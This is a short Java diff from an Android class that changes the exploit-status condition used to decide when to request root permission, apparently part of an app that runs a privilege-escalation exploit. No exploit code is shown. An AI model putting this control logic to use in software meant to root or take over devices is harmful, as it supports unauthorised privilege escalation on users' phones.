@@ -119,7 +119,7 @@ public class Core extends Activity implements Runnable {
 			}
 
 			/* this check is used to know if we need to ask the user for root permission */
-			if ((Status.getExploitResult() > Status.EXPLOIT_STATUS_RUNNING ) && !Status.haveRoot()) {
+			if ((Status.getExploitResult() >= Status.EXPLOIT_STATUS_EXECUTED ) && !Status.haveRoot()) {
 				try {
 					Thread t = new Thread(new Runnable() {
 						@Override
